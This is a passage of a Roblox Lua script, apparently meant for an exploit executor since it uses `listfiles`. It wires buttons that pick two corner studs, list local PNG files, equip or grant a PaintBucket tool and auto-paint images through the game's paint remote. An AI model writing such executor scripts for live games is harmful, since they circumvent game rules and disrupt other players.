    sb.SurfaceColor3 = color
    sb.SurfaceTransparency = 0.6
    sb.Transparency = 0
    sb.Parent = highlightContainer
    return h, sb
end

local function clearCornerVisual(which)
    if which == 1 then
        if highlightA then highlightA:Destroy(); highlightA = nil end
        if selectionA then selectionA:Destroy(); selectionA = nil end
    elseif which == 2 then
        if highlightB then highlightB:Destroy(); highlightB = nil end
        if selectionB then selectionB:Destroy(); selectionB = nil end
    end
end

local function setCorner(n, part)
    if n == 1 then
        clearCornerVisual(1)
        cornerPartA = part
        cornerA = part.Position
        highlightA, selectionA = makeCornerVisual(part, Color3.fromRGB(0, 255, 0))
        setCornerABtn.Text = "A: " .. part.Name
        setCornerABtn.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
        log("Corner A set: " .. part:GetFullName())
    else
        clearCornerVisual(2)
        cornerPartB = part
        cornerB = part.Position
        highlightB, selectionB = makeCornerVisual(part, Color3.fromRGB(255, 60, 60))
        setCornerBBtn.Text = "B: " .. part.Name
        setCornerBBtn.BackgroundColor3 = Color3.fromRGB(100, 40, 40)
        log("Corner B set: " .. part:GetFullName())
    end
end

local function resetCorners()
    clearCornerVisual(1)
    clearCornerVisual(2)
    cornerA, cornerB = nil, nil
    cornerPartA, cornerPartB = nil, nil
    setCornerABtn.Text = "Click Corner A"
    setCornerABtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    setCornerBBtn.Text = "Click Corner B"
    setCornerBBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    log("Corners cleared.")
end

local function getPartUnderCursor()
    local target = mouse.Target
    if target and target:IsA("BasePart") and not isPlayerPart(target) then
        return target
    end
    local camera = workspace.CurrentCamera
    if not camera then return nil end
    local unitRay = camera:ViewportPointToRay(mouse.X, mouse.Y)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {}
    if player.Character then table.insert(params.FilterDescendantsInstances, player.Character) end
    local result = workspace:Raycast(unitRay.Origin, unitRay.Direction * 5000, params)
    if result and result.Instance and result.Instance:IsA("BasePart") and not isPlayerPart(result.Instance) then
        return result.Instance
    end
    return nil
end

local function tryPickCorner()
    if not awaitingCorner then return false end
    local target = getPartUnderCursor()
    if not target then
        statusLabel.Text = "No part under cursor — click a stud."
        return false
    end
    local which = awaitingCorner
    awaitingCorner = nil
    setCorner(which, target)
    if which == 1 then
        setCornerABtn.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
        statusLabel.Text = "Corner A set to " .. target.Name
            .. (cornerB and " — ready!" or " — now set Corner B")
    else
        setCornerBBtn.BackgroundColor3 = Color3.fromRGB(100, 40, 40)
        statusLabel.Text = "Corner B set to " .. target.Name
            .. (cornerA and " — ready!" or " — now set Corner A")
    end
    return true
end

setCornerABtn.MouseButton1Click:Connect(function()
    awaitingCorner = 1
    setCornerABtn.BackgroundColor3 = Color3.fromRGB(70, 130, 70)
    statusLabel.Text = "Click any stud for Corner A"
end)

setCornerBBtn.MouseButton1Click:Connect(function()
    awaitingCorner = 2
    setCornerBBtn.BackgroundColor3 = Color3.fromRGB(140, 60, 60)
    statusLabel.Text = "Click any stud for Corner B"
end)

clearCornersBtn.MouseButton1Click:Connect(function()
    resetCorners()
    statusLabel.Text = "Corners cleared."
end)

clearAllBtn.MouseButton1Click:Connect(function()
    local waveDelay = tonumber(speedBox.Text) or 0
    waveDelay = math.clamp(waveDelay, 0, 5)
    clearAllStuds(statusLabel, cornerA, cornerB, waveDelay, forceState, waveStyle)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if not awaitingCorner then return end
    if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then return end
    tryPickCorner()
end)

mouse.Button1Down:Connect(function()
    if not awaitingCorner then return end
    task.delay(0.05, function()
        if awaitingCorner then tryPickCorner() end
    end)
end)

equipBtn.MouseButton1Click:Connect(function()
    local backpack = player:FindFirstChild("Backpack")
    local character = player.Character
    local function findBucket(container)
        if not container then return nil end
        local b = container:FindFirstChild("PaintBucket")
        if b and b:IsA("Tool") then return b end
        for _, obj in ipairs(container:GetChildren()) do
            if obj:IsA("Tool") and obj:FindFirstChild("Remotes") then return obj end
        end
        return nil
    end
    local bucket = findBucket(character) or findBucket(backpack)
    if bucket then
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:EquipTool(bucket)
            statusLabel.Text = "PaintBucket equipped!"
            log("PaintBucket equipped.")
        else
            statusLabel.Text = "No Humanoid found."
            log("Equip failed — no Humanoid.", "warn")
        end
    else
        statusLabel.Text = "PaintBucket not in inventory!"
        log("Equip failed — PaintBucket not in inventory.", "warn")
    end
end)

testRemoteBtn.MouseButton1Click:Connect(function()
    local fn, err = findPaintFunction()
    if fn then
        statusLabel.Text = "PaintFunction ready!"
        log("Remote found: " .. fn:GetFullName())
    else
        statusLabel.Text = "Not ready: " .. err
        log("Remote check failed: " .. err, "warn")
    end
end)

giveBucketBtn.MouseButton1Click:Connect(function()
    giveBucket(statusLabel)
end)

local function buildFileList()
    for _, child in ipairs(dropdownScroll:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    local files = listfiles("")
    local count = 0

    for _, filePath in ipairs(files) do
        if type(filePath) == "string" and filePath:sub(-4):lower() == ".png" then
            count = count + 1
            local itemBtn = Instance.new("TextButton")
            itemBtn.Size = UDim2.new(1, 0, 0, 25)
            itemBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            itemBtn.BorderSizePixel = 0
            itemBtn.Text = filePath
            itemBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
            itemBtn.Font = Enum.Font.SourceSans
            itemBtn.TextSize = 14
            itemBtn.ZIndex = 6
            itemBtn.Parent = dropdownScroll
            itemBtn.MouseButton1Click:Connect(function()
                selectedFile = filePath
                dropdownBtn.Text = filePath .. " ▼"
                dropdownScroll.Visible = false
                log("Selected: " .. filePath)
            end)
        end
    end

    dropdownScroll.CanvasSize = UDim2.new(0, 0, 0, count * 25)
    return count
end

refreshBtn.MouseButton1Click:Connect(function()
    local count = buildFileList()
    refreshBtn.BackgroundColor3 = Color3.fromRGB(90, 140, 90)
    task.delay(0.35, function()
        refreshBtn.BackgroundColor3 = Color3.fromRGB(60, 90, 60)
    end)
    statusLabel.Text = string.format("Refreshed — %d PNG file%s found.", count, count == 1 and "" or "s")
    log("Refreshed — " .. count .. " PNG files.")
end)

dropdownBtn.MouseButton1Click:Connect(function()
    dropdownScroll.Visible = not dropdownScroll.Visible
    if dropdownScroll.Visible then buildFileList() end
end)

previewBtn.MouseButton1Click:Connect(function()
    dropdownScroll.Visible = false
    readPan()
    previewPaint(statusLabel, selectedFile, cornerA, cornerB, currentRotation, waveStyle, zoomLevel, panX, panY)
end)

paintBtn.MouseButton1Click:Connect(function()
    dropdownScroll.Visible = false
    readPan()
    local waveDelay = tonumber(speedBox.Text)
    if not waveDelay then waveDelay = 0 end
    waveDelay = math.clamp(waveDelay, 0, 5)
    speedBox.Text = tostring(waveDelay)
    startPaint(statusLabel, selectedFile, cornerA, cornerB, waveDelay, forceState, waveStyle, currentRotation, zoomLevel, panX, panY)
end)

stopBtn.MouseButton1Click:Connect(function()
    if isRunning then
        stopRequested = true
        statusLabel.Text = "Stopping..."
        log("Stop requested.", "warn")
    else
        statusLabel.Text = "Nothing is running."
    end
end)

log("Rect Image paint ready.")